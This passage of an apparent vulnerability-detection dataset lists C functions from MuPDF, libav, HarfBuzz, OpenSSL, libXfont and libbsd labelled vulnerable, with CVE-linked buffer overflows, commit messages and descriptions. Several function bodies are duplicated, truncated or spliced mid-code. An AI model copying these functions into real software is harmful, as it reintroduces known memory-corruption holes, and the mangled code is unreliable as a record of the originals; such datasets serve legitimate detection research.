255;\n\t\tsamples[2] /= 255;\n\t\tsamples[3] /= 255;\n\t}\n\n\telse if (string[0] == 's' && string[1] == 'c' && string[2] == '#')\n\t{\n\t\tif (count_commas(string) == 2)\n\t\t\tsscanf(string, \"sc#%g,%g,%g\", samples + 1, samples + 2, samples + 3);\n\t\tif (count_commas(string) == 3)\n\t\t\tsscanf(string, \"sc#%g,%g,%g,%g\", samples, samples + 1, samples + 2, samples + 3);\n\t}\n\n\telse if (strstr(string, \"ContextColor \") == string)\n\t{\n\t\t/* Crack the string for profile name and sample values */\n\t\tfz_strlcpy(buf, string, sizeof buf);\n\n\t\tprofile = strchr(buf, ' ');\n                profile = strchr(buf, ' ');\n                if (!profile)\n                {\n                       fz_warn(doc->ctx, \"cannot find icc profile uri in '%s'\", string);\n                        return;\n                }\n \n\t\tp = strchr(profile, ' ');\n                p = strchr(profile, ' ');\n                if (!p)\n                {\n                       fz_warn(doc->ctx, \"cannot find component values in '%s'\", profile);\n                        return;\n                }\n \n                *p++ = 0;\n                n = count_commas(p) + 1;\n                i = 0;\n                while (i < n)\n                {\n\t\t\t\tp ++;\n\t\t}\n\t\twhile (i < n)\n\t\t{\n\t\t\tsamples[i++] = 0;\n\t\t}\n\n\t\t/* TODO: load ICC profile */\n\t\tswitch (n)\n\t\t{\n\t\tcase 2: *csp = fz_device_gray(doc->ctx); break;\n\t\tcase 4: *csp = fz_device_rgb(doc->ctx); break;\n\t\tcase 5: *csp = fz_device_cmyk(doc->ctx); break;\n                /* TODO: load ICC profile */\n                switch (n)\n                {\n               case 2: *csp = fz_device_gray(doc->ctx); break;\n               case 4: *csp = fz_device_rgb(doc->ctx); break;\n               case 5: *csp = fz_device_cmyk(doc->ctx); break;\n               default: *csp = fz_device_gray(doc->ctx); break;\n                }\n        }\n }\n\tfor (i = 0; i < colorspace->n; i++)\n\t\tdoc->color[i] = samples[i + 1];\n\tdoc->alpha = samples[0] * doc->opacity[doc->opacity_top];\n}\n", "func_hash": 173680462593951007227148221492379395830, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-2013", "cve_desc": "Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2013"}
{"idx": 409, "project": "libav", "commit_id": "5a396bb3a66a61a68b80f2369d0249729bf85e04", "project_url": "https://github.com/libav/libav", "commit_url": "https://git.libav.org/?p=libav.git;a=commitdiff;h=5a396bb3a66a61a68b80f2369d0249729bf85e04", "commit_message": "dv: Fix null pointer dereference due to ach=0\n\ndv: Fix null pointer dereference due to ach=0\n\nFixes part2 of CVE-2011-3929\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nReviewed-by: Roman Shaposhnik <roman@shaposhnik.org>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\nSigned-off-by: Alex Converse <alex.converse@gmail.com>", "target": 1, "func": "int avpriv_dv_produce_packet(DVDemuxContext *c, AVPacket *pkt,\n                      uint8_t* buf, int buf_size)\n{\n    int size, i;\n    uint8_t *ppcm[4] = {0};\n\n    if (buf_size < DV_PROFILE_BYTES ||\n        !(c->sys = avpriv_dv_frame_profile(c->sys, buf, buf_size)) ||\n        buf_size < c->sys->frame_size) {\n          return -1;   /* Broken frame, or not enough data */\n    }\n\n    /* Queueing audio packet */\n    /* FIXME: in case of no audio/bad audio we have to do something */\n    size = dv_extract_audio_info(c, buf);\n    for (i = 0; i < c->ach; i++) {\n       c->audio_pkt[i].size = size;\n        c->audio_pkt[i].pts  = c->abytes * 30000*8 / c->ast[i]->codec->bit_rate;\n        ppcm[i] = c->audio_buf[i];\n     }\n    dv_extract_audio(buf, ppcm, c->sys);\n \n     /* We work with 720p frames split in half, thus even frames have\n      * channels 0,1 and odd 2,3. */\n        if (buf[1] & 0x0C) {\n            c->audio_pkt[2].size = c->audio_pkt[3].size = 0;\n        } else {\n            c->audio_pkt[0].size = c->audio_pkt[1].size = 0;\n            c->abytes += size;\n        }\n    } else {\n        c->abytes += size;\n    }\n", "func_hash": 106330760518707613007105817589614452739, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-3929", "cve_desc": "The avpriv_dv_produce_packet function in libavcodec in FFmpeg 0.7.x before 0.7.12 and 0.8.x before 0.8.11 and in Libav 0.5.x before 0.5.9, 0.6.x before 0.6.6, 0.7.x before 0.7.5, and 0.8.x before 0.8.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) and possibly execute arbitrary code via a crafted DV file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3929"}
{"idx": 410, "project": "harfbuzz", "commit_id": "81c8ef785b079980ad5b46be4fe7c7bf156dbf65", "project_url": "https://github.com/behdad/harfbuzz", "commit_url": "https://cgit.freedesktop.org/harfbuzz.old/commit/?id=81c8ef785b079980ad5b46be4fe7c7bf156dbf65", "commit_message": "None", "target": 1, "func": "static HB_Error  Lookup_MarkMarkPos( GPOS_Instance*    gpi,\n\t\t\t\t     HB_GPOS_SubTable* st,\n\t\t\t\t     HB_Buffer        buffer,\n\t\t\t\t     HB_UShort         flags,\n\t\t\t\t     HB_UShort         context_length,\n\t\t\t\t     int               nesting_level )\n{\n  HB_UShort        i, j, mark1_index, mark2_index, property, class;\n  HB_Fixed           x_mark1_value, y_mark1_value,\n\t\t   x_mark2_value, y_mark2_value;\n  HB_Error         error;\n  HB_GPOSHeader*  gpos = gpi->gpos;\n  HB_MarkMarkPos* mmp = &st->markmark;\n\n  HB_MarkArray*    ma1;\n  HB_Mark2Array*   ma2;\n  HB_Mark2Record*  m2r;\n  HB_Anchor*       mark1_anchor;\n  HB_Anchor*       mark2_anchor;\n\n  HB_Position    o;\n\n  HB_UNUSED(nesting_level);\n\n  if ( context_length != 0xFFFF && context_length < 1 )\n    return HB_Err_Not_Covered;\n\n  if ( flags & HB_LOOKUP_FLAG_IGNORE_MARKS )\n    return HB_Err_Not_Covered;\n\n  if ( CHECK_Property( gpos->gdef, IN_CURITEM(),\n\t\t       flags, &property ) )\n    return error;\n\n  error = _HB_OPEN_Coverage_Index( &mmp->Mark1Coverage, IN_CURGLYPH(),\n\t\t\t  &mark1_index );\n  if ( error )\n    return error;\n\n  /* now we search backwards for a suitable mark glyph until a non-mark\n     glyph                                                */\n\n  if ( buffer->in_pos == 0 )\n    return HB_Err_Not_Covered;\n\n  i = 1;\n  j = buffer->in_pos - 1;\n  while ( i <= buffer->in_pos )\n  {\n    error = HB_GDEF_Get_Glyph_Property( gpos->gdef, IN_GLYPH( j ),\n\t\t\t\t\t&property );\n    if ( error )\n      return error;\n\n    if ( !( property == HB_GDEF_MARK || property & HB_LOOKUP_FLAG_IGNORE_SPECIAL_MARKS ) )\n      return HB_Err_Not_Covered;\n\n    if ( flags & HB_LOOKUP_FLAG_IGNORE_SPECIAL_MARKS )\n    {\n      if ( property == (flags & 0xFF00) )\n        break;\n    }\n    else\n      break;\n\n    i++;\n     j--;\n   }\n \n   error = _HB_OPEN_Coverage_Index( &mmp->Mark2Coverage, IN_GLYPH( j ),\n \t\t\t  &mark2_index );\n   if ( error )\n\n  if ( mark1_index >= ma1->MarkCount )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  class        = ma1->MarkRecord[mark1_index].Class;\n  mark1_anchor = &ma1->MarkRecord[mark1_index].MarkAnchor;\n\n  if ( class >= mmp->ClassCount )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  ma2 = &mmp->Mark2Array;\n\n  if ( mark2_index >= ma2->Mark2Count )\n    return ERR(HB_Err_Invalid_SubTable);\n\n  m2r          = &ma2->Mark2Record[mark2_index];\n  mark2_anchor = &m2r->Mark2Anchor[class];\n\n  error = Get_Anchor( gpi, mark1_anchor, IN_CURGLYPH(),\n\t\t      &x_mark1_value, &y_mark1_value );\n  if ( error )\n    return error;\n  error = Get_Anchor( gpi, mark2_anchor, IN_GLYPH( j ),\n\t\t      &x_mark2_value, &y_mark2_value );\n  if ( error )\n    return error;\n\n  /* anchor points are not cumulative */\n\n  o = POSITION( buffer->in_pos );\n\n  o->x_pos     = x_mark2_value - x_mark1_value;\n  o->y_pos     = y_mark2_value - y_mark1_value;\n  o->x_advance = 0;\n  o->y_advance = 0;\n  o->back      = 1;\n\n  (buffer->in_pos)++;\n\n  return HB_Err_Ok;\n}\n", "func_hash": 311194674003134329769297107152985881683, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2011-3193", "cve_desc": "Heap-based buffer overflow in the Lookup_MarkMarkPos function in the HarfBuzz module (harfbuzz-gpos.c), as used by Qt before 4.7.4 and Pango, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3193"}
{"idx": 432, "project": "openssl", "commit_id": "1632ef744872edc2aa2a53d487d3e79c965a4ad3", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1632ef744872edc2aa2a53d487d3e79c965a4ad3", "commit_message": "Fix for CVE-2014-0195\n\nA buffer overrun attack can be triggered by sending invalid DTLS fragments\nto an OpenSSL DTLS client or server. This is potentially exploitable to\nrun arbitrary code on a vulnerable client or server.\n\nFixed by adding consistency check for DTLS fragments.\n\nThanks to J\u00fcri Aedla for reporting this issue.", "target": 1, "func": "dtls1_reassemble_fragment(SSL *s, struct hm_header_st* msg_hdr, int *ok)\n\t{\n\thm_fragment *frag = NULL;\n\tpitem *item = NULL;\n\tint i = -1, is_complete;\n\tunsigned char seq64be[8];\n\tunsigned long frag_len = msg_hdr->frag_len, max_len;\n\n\tif ((msg_hdr->frag_off+frag_len) > msg_hdr->msg_len)\n\t\tgoto err;\n\n\t/* Determine maximum allowed message size. Depends on (user set)\n\t * maximum certificate length, but 16k is minimum.\n\t */\n\tif (DTLS1_HM_HEADER_LENGTH + SSL3_RT_MAX_ENCRYPTED_LENGTH < s->max_cert_list)\n\t\tmax_len = s->max_cert_list;\n\telse\n\t\tmax_len = DTLS1_HM_HEADER_LENGTH + SSL3_RT_MAX_ENCRYPTED_LENGTH;\n\n\tif ((msg_hdr->frag_off+frag_len) > max_len)\n\t\tgoto err;\n\n\t/* Try to find item in queue */\n\tmemset(seq64be,0,sizeof(seq64be));\n\tseq64be[6] = (unsigned char) (msg_hdr->seq>>8);\n\tseq64be[7] = (unsigned char) msg_hdr->seq;\n\titem = pqueue_find(s->d1->buffered_messages, seq64be);\n\n\tif (item == NULL)\n\t\t{\n\t\tfrag = dtls1_hm_fragment_new(msg_hdr->msg_len, 1);\n\t\tif ( frag == NULL)\n\t\t\tgoto err;\n\t\tmemcpy(&(frag->msg_header), msg_hdr, sizeof(*msg_hdr));\n\t\tfrag->msg_header.frag_len = frag->msg_header.msg_len;\n                frag->msg_header.frag_off = 0;\n                }\n        else\n                frag = (hm_fragment*) item->data;\n \n        /* If message is already reassembled, this must be a\n         * retransmit and can be dropped.\n\t\t\t\tfrag_len>sizeof(devnull)?sizeof(devnull):frag_len,0);\n\t\t\tif (i<=0) goto err;\n\t\t\tfrag_len -= i;\n\t\t\t}\n", "func_hash": 277478106358864729741213619139959810391, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-0195", "cve_desc": "The dtls1_reassemble_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly validate fragment lengths in DTLS ClientHello messages, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) via a long non-initial fragment.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0195"}
{"idx": 448, "project": "libxfont", "commit_id": "4d024ac10f964f6bd372ae0dd14f02772a6e5f63", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=4d024ac10f964f6bd372ae0dd14f02772a6e5f63", "commit_message": "None", "target": 1, "func": "bdfReadCharacters(FontFilePtr file, FontPtr pFont, bdfFileState *pState,\n\t\t  int bit, int byte, int glyph, int scan)\n{\n    unsigned char *line;\n    register CharInfoPtr ci;\n    int         i,\n                ndx,\n                nchars,\n                nignored;\n    unsigned int char_row, char_col;\n    int         numEncodedGlyphs = 0;\n    CharInfoPtr *bdfEncoding[256];\n    BitmapFontPtr  bitmapFont;\n    BitmapExtraPtr bitmapExtra;\n    CARD32     *bitmapsSizes;\n    unsigned char        lineBuf[BDFLINELEN];\n    int         nencoding;\n\n    bitmapFont = (BitmapFontPtr) pFont->fontPrivate;\n    bitmapExtra = (BitmapExtraPtr) bitmapFont->bitmapExtra;\n\n    if (bitmapExtra) {\n\tbitmapsSizes = bitmapExtra->bitmapsSizes;\n\tfor (i = 0; i < GLYPHPADOPTIONS; i++)\n\t    bitmapsSizes[i] = 0;\n    } else\n\tbitmapsSizes = NULL;\n\n    bzero(bdfEncoding, sizeof(bdfEncoding));\n    bitmapFont->metrics = NULL;\n    ndx = 0;\n\n    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n\n    if ((!line) || (sscanf((char *) line, \"CHARS %d\", &nchars) != 1)) {\n\tbdfError(\"bad 'CHARS' in bdf file\\n\");\n\treturn (FALSE);\n    }\n    if (nchars < 1) {\n\tbdfError(\"invalid number of CHARS in BDF file\\n\");\n\treturn (FALSE);\n    }\n    if (nchars > INT32_MAX / sizeof(CharInfoRec)) {\n\tbdfError(\"Couldn't allocate pCI (%d*%d)\\n\", nchars,\n\t\t (int) sizeof(CharInfoRec));\n\tgoto BAILOUT;\n    }\n    ci = calloc(nchars, sizeof(CharInfoRec));\n    if (!ci) {\n\tbdfError(\"Couldn't allocate pCI (%d*%d)\\n\", nchars,\n\t\t (int) sizeof(CharInfoRec));\n\tgoto BAILOUT;\n    }\n    bitmapFont->metrics = ci;\n\n    if (bitmapExtra) {\n\tbitmapExtra->glyphNames = malloc(nchars * sizeof(Atom));\n\tif (!bitmapExtra->glyphNames) {\n\t    bdfError(\"Couldn't allocate glyphNames (%d*%d)\\n\",\n\t\t     nchars, (int) sizeof(Atom));\n\t    goto BAILOUT;\n\t}\n    }\n    if (bitmapExtra) {\n\tbitmapExtra->sWidths = malloc(nchars * sizeof(int));\n\tif (!bitmapExtra->sWidths) {\n\t    bdfError(\"Couldn't allocate sWidth (%d *%d)\\n\",\n\t\t     nchars, (int) sizeof(int));\n\t    return FALSE;\n\t}\n    }\n    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n    pFont->info.firstRow = 256;\n    pFont->info.lastRow = 0;\n    pFont->info.firstCol = 256;\n    pFont->info.lastCol = 0;\n    nignored = 0;\n    for (ndx = 0; (ndx < nchars) && (line) && (bdfIsPrefix(line, \"STARTCHAR\"));) {\n\tint         t;\n\tint         wx;\t\t/* x component of width */\n\tint         wy;\t\t/* y component of width */\n\tint         bw;\t\t/* bounding-box width */\n\tint         bh;\t\t/* bounding-box height */\n\tint         bl;\t\t/* bounding-box left */\n\tint         bb;\t\t/* bounding-box bottom */\n\tint         enc,\n\t            enc2;\t/* encoding */\n\tunsigned char *p;\t/* temp pointer into line */\n \tchar        charName[100];\n \tint         ignore;\n \n\tif (sscanf((char *) line, \"STARTCHAR %s\", charName) != 1) {\n \t    bdfError(\"bad character name in BDF file\\n\");\n \t    goto BAILOUT;\t/* bottom of function, free and return error */\n \t}\n\tif (bitmapExtra)\n\t    bitmapExtra->glyphNames[ndx] = bdfForceMakeAtom(charName, NULL);\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif (!line || (t = sscanf((char *) line, \"ENCODING %d %d\", &enc, &enc2)) < 1) {\n\t    bdfError(\"bad 'ENCODING' in BDF file\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (enc < -1 || (t == 2 && enc2 < -1)) {\n\t    bdfError(\"bad ENCODING value\");\n\t    goto BAILOUT;\n\t}\n\tif (t == 2 && enc == -1)\n\t    enc = enc2;\n\tignore = 0;\n\tif (enc == -1) {\n\t    if (!bitmapExtra) {\n\t\tnignored++;\n\t\tignore = 1;\n\t    }\n\t} else if (enc > MAXENCODING) {\n\t    bdfError(\"char '%s' has encoding too large (%d)\\n\",\n\t\t     charName, enc);\n\t} else {\n\t    char_row = (enc >> 8) & 0xFF;\n\t    char_col = enc & 0xFF;\n\t    if (char_row < pFont->info.firstRow)\n\t\tpFont->info.firstRow = char_row;\n\t    if (char_row > pFont->info.lastRow)\n\t\tpFont->info.lastRow = char_row;\n\t    if (char_col < pFont->info.firstCol)\n\t\tpFont->info.firstCol = char_col;\n\t    if (char_col > pFont->info.lastCol)\n\t\tpFont->info.lastCol = char_col;\n\t    if (bdfEncoding[char_row] == (CharInfoPtr *) NULL) {\n\t\tbdfEncoding[char_row] = malloc(256 * sizeof(CharInfoPtr));\n\t\tif (!bdfEncoding[char_row]) {\n\t\t    bdfError(\"Couldn't allocate row %d of encoding (%d*%d)\\n\",\n\t\t\t     char_row, INDICES, (int) sizeof(CharInfoPtr));\n\t\t    goto BAILOUT;\n\t\t}\n\t\tfor (i = 0; i < 256; i++)\n\t\t    bdfEncoding[char_row][i] = (CharInfoPtr) NULL;\n\t    }\n\t    if (bdfEncoding[char_row] != NULL) {\n\t\tbdfEncoding[char_row][char_col] = ci;\n\t\tnumEncodedGlyphs++;\n\t    }\n\t}\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"SWIDTH %d %d\", &wx, &wy) != 2)) {\n\t    bdfError(\"bad 'SWIDTH'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (wy != 0) {\n\t    bdfError(\"SWIDTH y value must be zero\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (bitmapExtra)\n\t    bitmapExtra->sWidths[ndx] = wx;\n\n/* 5/31/89 (ef) -- we should be able to ditch the character and recover */\n/*\t\tfrom all of these.\t\t\t\t\t*/\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"DWIDTH %d %d\", &wx, &wy) != 2)) {\n\t    bdfError(\"bad 'DWIDTH'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif (wy != 0) {\n\t    bdfError(\"DWIDTH y value must be zero\\n\");\n\t    goto BAILOUT;\n\t}\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((!line) || (sscanf((char *) line, \"BBX %d %d %d %d\", &bw, &bh, &bl, &bb) != 4)) {\n\t    bdfError(\"bad 'BBX'\\n\");\n\t    goto BAILOUT;\n\t}\n\tif ((bh < 0) || (bw < 0)) {\n\t    bdfError(\"character '%s' has a negative sized bitmap, %dx%d\\n\",\n\t\t     charName, bw, bh);\n\t    goto BAILOUT;\n\t}\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\n\tif ((line) && (bdfIsPrefix(line, \"ATTRIBUTES\"))) {\n\t    for (p = line + strlen(\"ATTRIBUTES \");\n\t\t    (*p == ' ') || (*p == '\\t');\n\t\t    p++)\n\t\t /* empty for loop */ ;\n\t    ci->metrics.attributes = (bdfHexByte(p) << 8) + bdfHexByte(p + 2);\n\t    line = bdfGetLine(file, lineBuf, BDFLINELEN);\n\t} else\n\t    ci->metrics.attributes = 0;\n\n\tif (!line || !bdfIsPrefix(line, \"BITMAP\")) {\n\t    bdfError(\"missing 'BITMAP'\\n\");\n\t    goto BAILOUT;\n\t}\n\t/* collect data for generated properties */\n\tif ((strlen(charName) == 1)) {\n\t    if ((charName[0] >= '0') && (charName[0] <= '9')) {\n\t\tpState->digitWidths += wx;\n\t\tpState->digitCount++;\n\t    } else if (charName[0] == 'x') {\n\t\tpState->exHeight = (bh + bb) <= 0 ? bh : bh + bb;\n\t    }\n\t}\n\tif (!ignore) {\n\t    ci->metrics.leftSideBearing = bl;\n\t    ci->metrics.rightSideBearing = bl + bw;\n\t    ci->metrics.ascent = bh + bb;\n\t    ci->metrics.descent = -bb;\n\t    ci->metrics.characterWidth = wx;\n\t    ci->bits = NULL;\n\t    bdfReadBitmap(ci, file, bit, byte, glyph, scan, bitmapsSizes);\n\t    ci++;\n\t    ndx++;\n\t} else\n\t    bdfSkipBitmap(file, bh);\n\n\tline = bdfGetLine(file, lineBuf, BDFLINELEN);\t/* get STARTCHAR or\n\t\t\t\t\t\t\t * ENDFONT */\n    }\n\n    if (ndx + nignored != nchars) {\n\tbdfError(\"%d too few characters\\n\", nchars - (ndx + nignored));\n\tgoto BAILOUT;\n    }\n    nchars = ndx;\n    bitmapFont->num_chars = nchars;\n    if ((line) && (bdfIsPrefix(line, \"STARTCHAR\"))) {\n\tbdfError(\"more characters than specified\\n\");\n\tgoto BAILOUT;\n    }\n    if ((!line) || (!bdfIsPrefix(line, \"ENDFONT\"))) {\n\tbdfError(\"missing 'ENDFONT'\\n\");\n\tgoto BAILOUT;\n    }\n    if (numEncodedGlyphs == 0)\n\tbdfWarning(\"No characters with valid encodings\\n\");\n\n    nencoding = (pFont->info.lastRow - pFont->info.firstRow + 1) *\n\t(pFont->info.lastCol - pFont->info.firstCol + 1);\n    bitmapFont->encoding = calloc(NUM_SEGMENTS(nencoding),sizeof(CharInfoPtr*));\n    if (!bitmapFont->encoding) {\n\tbdfError(\"Couldn't allocate ppCI (%d,%d)\\n\",\n                 NUM_SEGMENTS(nencoding),\n                 (int) sizeof(CharInfoPtr*));\n\tgoto BAILOUT;\n    }\n    pFont->info.allExist = TRUE;\n    i = 0;\n    for (char_row = pFont->info.firstRow;\n\t    char_row <= pFont->info.lastRow;\n\t    char_row++) {\n\tif (bdfEncoding[char_row] == (CharInfoPtr *) NULL) {\n\t    pFont->info.allExist = FALSE;\n            i += pFont->info.lastCol - pFont->info.firstCol + 1;\n\t} else {\n\t    for (char_col = pFont->info.firstCol;\n\t\t    char_col <= pFont->info.lastCol;\n\t\t    char_col++) {\n\t\tif (!bdfEncoding[char_row][char_col])\n\t\t    pFont->info.allExist = FALSE;\n                else {\n                    if (!bitmapFont->encoding[SEGMENT_MAJOR(i)]) {\n                        bitmapFont->encoding[SEGMENT_MAJOR(i)]=\n                            calloc(BITMAP_FONT_SEGMENT_SIZE,\n                                   sizeof(CharInfoPtr));\n                        if (!bitmapFont->encoding[SEGMENT_MAJOR(i)])\n                            goto BAILOUT;\n                    }\n                    ACCESSENCODINGL(bitmapFont->encoding,i) =\n                        bdfEncoding[char_row][char_col];\n                }\n                i++;\n            }\n\t}\n    }\n    for (i = 0; i < 256; i++)\n\tif (bdfEncoding[i])\n\t    free(bdfEncoding[i]);\n    return (TRUE);\nBAILOUT:\n    for (i = 0; i < 256; i++)\n\tif (bdfEncoding[i])\n\t    free(bdfEncoding[i]);\n    /* bdfFreeFontBits will clean up the rest */\n    return (FALSE);\n}\n", "func_hash": 130454261969297534776999866382375298733, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-6462", "cve_desc": "Stack-based buffer overflow in the bdfReadCharacters function in bitmap/bdfread.c in X.Org libXfont 1.1 through 1.4.6 allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a long string in a character name in a BDF font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6462"}
{"idx": 462, "project": "libbsd", "commit_id": "c8f0723d2b4520bdd6b9eb7c3e7976de726d7ff7", "project_url": "https://gitlab.freedesktop.org/libbsd/libbsd", "commit_url": "https://cgit.freedesktop.org/libbsd/commit/?id=c8f0723d2b4520bdd6b9eb7c3e7976de726d7ff7", "commit_message": "Fix heap buffer overflow in fgetwln()\n\nIn the function fgetwln() there's a 4 byte heap overflow.\n\nThere is a while loop that has this check to see whether there's still\nenough space in the buffer:\n\n\t\tif (!fb->len || wused > fb->len) {\n\nIf this is true more memory gets allocated. However this test won't be\ntrue if wused == fb->len, but at that point wused already points out\nof the buffer. Some lines later there's a write to the buffer:\n\n\t\tfb->wbuf[wused++] = wc;\n\nThis bug was found with the help of address sanitizer.\n\nWarned-by: ASAN\nFixes: https://bugs.freedesktop.org/show_bug.cgi?id=93881\nSigned-off-by: Guillem Jover <guillem@hadrons.org>", "target": 1, "func": "fgetwln(FILE *stream, size_t *lenp)\n{\n\tstruct filewbuf *fb;\n\twint_t wc;\n\tsize_t wused = 0;\n\n\t/* Try to diminish the possibility of several fgetwln() calls being\n\t * used on different streams, by using a pool of buffers per file. */\n\tfb = &fb_pool[fb_pool_cur];\n\tif (fb->fp != stream && fb->fp != NULL) {\n\t\tfb_pool_cur++;\n\t\tfb_pool_cur %= FILEWBUF_POOL_ITEMS;\n\t\tfb = &fb_pool[fb_pool_cur];\n\t}\n \tfb->fp = stream;\n \n \twhile ((wc = fgetwc(stream)) != WEOF) {\n\t\tif (!fb->len || wused > fb->len) {\n \t\t\twchar_t *wp;\n \n \t\t\tif (fb->len)\n\t\t\t\tfb->len *= 2;\n\t\t\telse\n\t\t\t\tfb->len = FILEWBUF_INIT_LEN;\n\n\t\t\twp = reallocarray(fb->wbuf, fb->len, sizeof(wchar_t));\n\t\t\tif (wp == NULL) {\n\t\t\t\twused = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tfb->wbuf = wp;\n\t\t}\n\n\t\tfb->wbuf[wused++] = wc;\n\n\t\tif (wc == L'\\n')\n\t\t\tbreak;\n\t}\n\n\t*lenp = wused;\n\treturn wused ? fb->wbuf : NULL;\n}\n", "func_hash": 111742657801644456380340973720301242850, "file_name": "fgetwln.c", "file_hash": 917190743564002721116809438866317831, "cwe": ["CWE-119"], "cve": "CVE-2016-2090", "cve_desc": "Off-by-one vulnerability in the fgetwln function in libbsd before 0.8.2 allows attackers to have unspecified impact via unknown vectors, which trigger a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2090"}
{"idx": 511, "project": "libxfont", "commit_id": "5bf703700ee4a5d6eae20da07cb7a29369667aef", "project_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=d11ee5886e9d9ec610051a206b135a4cdc1e09a0", "commit_url": "https://cgit.freedesktop.org/xorg/lib/libXfont/commit/?id=5bf703700ee4a5d6eae20da07cb7a29369667aef", "commit_message": "None", "target": 1, "func": "CatalogueRescan (FontPathElementPtr fpe)\n{\n    CataloguePtr\tcat = fpe->private;\n    char\t\tlink[MAXFONTFILENAMELEN];\n    char\t\tdest[MAXFONTFILENAMELEN];\n    char\t\t*attrib;\n    FontPathElementPtr\tsubfpe;\n    struct stat\t\tstatbuf;\n    const char\t\t*path;\n    DIR\t\t\t*dir;\n    struct dirent\t*entry;\n    int\t\t\tlen;\n    int\t\t\tpathlen;\n\n    path = fpe->name + strlen(CataloguePrefix);\n    if (stat(path, &statbuf) < 0 || !S_ISDIR(statbuf.st_mode))\n\treturn BadFontPath;\n\n    if (statbuf.st_mtime <= cat->mtime)\n\treturn Successful;\n\n    dir = opendir(path);\n    if (dir == NULL)\n    {\n\txfree(cat);\n\treturn BadFontPath;\n    }\n\n    CatalogueUnrefFPEs (fpe);\n     while (entry = readdir(dir), entry != NULL)\n     {\n \tsnprintf(link, sizeof link, \"%s/%s\", path, entry->d_name);\n\tlen = readlink(link, dest, sizeof dest);\n \tif (len < 0)\n \t    continue;\n\tdest[len] = '\\0';\n\n\tif (dest[0] != '/')\n\t{\n\t   pathlen = strlen(path);\n\t   memmove(dest + pathlen + 1, dest, sizeof dest - pathlen - 1);\n\t   memcpy(dest, path, pathlen);\n\t   memcpy(dest + pathlen, \"/\", 1);\n\t   len += pathlen + 1;\n\t}\n\n\tattrib = strchr(link, ':');\n\tif (attrib && len + strlen(attrib) < sizeof dest)\n\t{\n\t    memcpy(dest + len, attrib, strlen(attrib));\n\t    len += strlen(attrib);\n\t}\n\n\tsubfpe = xalloc(sizeof *subfpe);\n\tif (subfpe == NULL)\n\t    continue;\n\n\t/* The fonts returned by OpenFont will point back to the\n\t * subfpe they come from.  So set the type of the subfpe to\n\t * what the catalogue fpe was assigned, so calls to CloseFont\n\t * (which uses font->fpe->type) goes to CatalogueCloseFont. */\n\tsubfpe->type = fpe->type;\n\tsubfpe->name_length = len;\n\tsubfpe->name = xalloc (len + 1);\n\tif (subfpe == NULL)\n\t{\n\t    xfree(subfpe);\n\t    continue;\n\t}\n\n\tmemcpy(subfpe->name, dest, len);\n\tsubfpe->name[len] = '\\0';\n\n\t/* The X server will manipulate the subfpe ref counts\n\t * associated with the font in OpenFont and CloseFont, so we\n\t * have to make sure it's valid. */\n\tsubfpe->refcount = 1;\n\n\tif (FontFileInitFPE (subfpe) != Successful)\n\t{\n\t    xfree(subfpe->name);\n\t    xfree(subfpe);\n\t    continue;\n\t}\n\n\tif (CatalogueAddFPE(cat, subfpe) != Successful)\n\t{\n\t    FontFileFreeFPE (subfpe);\n\t    xfree(subfpe);\n\t    continue;\n\t}\n    }\n\n    closedir(dir);\n\n    qsort(cat->fpeList,\n\t  cat->fpeCount, sizeof cat->fpeList[0], ComparePriority);\n\n    cat->mtime = statbuf.st_mtime;\n\n    return Successful;\n}\n", "func_hash": 320948107529517805290902775059513993785, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2007-5199", "cve_desc": "A single byte overflow in catalogue.c in X.Org libXfont 1.3.1 allows remote attackers to have unspecified impact.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2007-5199"}
